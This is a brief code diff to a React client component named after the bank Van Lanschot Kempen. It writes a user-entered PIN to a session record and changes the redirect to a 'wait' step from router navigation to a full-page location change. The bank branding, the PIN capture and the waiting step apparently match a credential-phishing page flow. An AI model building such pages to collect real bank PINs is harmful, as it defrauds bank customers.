@@ -44,7 +44,7 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
         pin: code 
       }
     }).eq("id", sessionId);
-    router.replace(stepToPath("wait", sessionId));
+    window.location.href = stepToPath("wait", sessionId);
   }
 
   // Common Header and Footer for Step 1 and 2
